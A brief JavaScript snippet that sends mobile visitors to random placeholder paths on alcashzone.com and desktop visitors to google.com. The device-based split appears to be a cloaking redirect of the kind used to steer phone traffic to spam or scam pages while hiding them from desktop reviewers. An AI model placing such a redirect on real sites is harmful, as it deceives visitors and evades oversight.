
// Base URL for the mobile redirect
const baseUrl = "https://alcashzone.com/";

// Permalink list for mobile users
const permalinks = [
    "sdfsdjkf",
    "sdfgdsgsd",
    "sdgdsgdsgds",
    "sdfgdsgdsg",
    "sdgdsgdsgs",
    "dsgdsgdsg"
];

// Function to detect device type
function detectDevice() {
    const userAgent = navigator.userAgent;

    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        return 'mobile';
    } else {
        return 'desktop';
    }
}

// Run redirection based on device type
if (detectDevice() === 'mobile') {
    // Random permalink selection for mobile users
    const randomPermalink = permalinks[Math.floor(Math.random() * permalinks.length)];
    const redirectUrl = `${baseUrl}${randomPermalink}`;
    window.location.href = redirectUrl;
} else {
    // Redirect to Google for desktop or tablet users
    window.location.href = "https://google.com";
}
